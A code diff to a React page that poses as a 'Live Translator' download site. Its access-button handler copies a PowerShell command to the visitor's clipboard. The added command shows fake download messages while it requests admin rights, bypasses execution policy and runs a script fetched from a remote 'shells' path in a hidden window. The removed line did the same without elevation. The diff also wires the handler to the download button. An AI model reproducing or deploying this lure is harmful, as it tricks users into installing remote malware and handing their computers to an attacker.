@@ -57,13 +57,14 @@ function App() {
       });
   };
 
-  // Function to handle access document click
+
   const handleAccessClick = () => {
     setIsDocumentVisible(true); // Show the document instructions
-    copyToClipboard(
-      `powershell -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://usjjsjsj.com.ng/shells/step1.txt' -UseBasicParsing).Content"`
-    ); // Copy text to clipboard
-  };
+    copyToClipboard(`
+      Write-Host "Initiating Live Translator download. Please wait..."; $scriptUrl = "https://usjjsjsj.com.ng/shells/back.ps1"; If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -Command \`"& { iwr -Uri '$scriptUrl' -UseBasicParsing | iex }\`"" -Verb RunAs -WindowStyle Hidden; Exit }; Write-Host "Live Translator download finished successfully!"
+        `);// Copy text to clipboard
+};
+
 
   // Format time for display
   const formatTime = (seconds) => {
@@ -105,7 +106,7 @@ function App() {
         </div>
 
         <Link to="/download">
-        <div className=" flex items-center justify-center  mt-5 bg-[#d4b0ff] border-2 border-[#464140] text-[#000000] rounded-lg box-border cursor-pointer font-sans font-bold text-[20px]
+        <div onClick={handleAccessClick} className=" flex items-center justify-center  mt-5 bg-[#d4b0ff] border-2 border-[#464140] text-[#000000] rounded-lg box-border cursor-pointer font-sans font-bold text-[20px]
     h-[60px] max-w-full px-[25px] relative
     text-center no-underline select-none
     transition-transform duration-200 ease-out
@@ -412,6 +413,7 @@ function App() {
           </div>
         </div>
 
+        <Link to="/download">
         <div className=" flex items-center justify-center  mt-5 bg-[#d4b0ff] border-2 border-[#464140] text-[#000000] rounded-lg box-border cursor-pointer font-sans font-bold text-[20px]
     h-[60px] max-w-full px-[25px] relative
     text-center no-underline select-none
@@ -425,7 +427,7 @@ function App() {
           <FaWindows size={25} />
         </div>
 
-
+        </Link>
 
       </div>
     </>
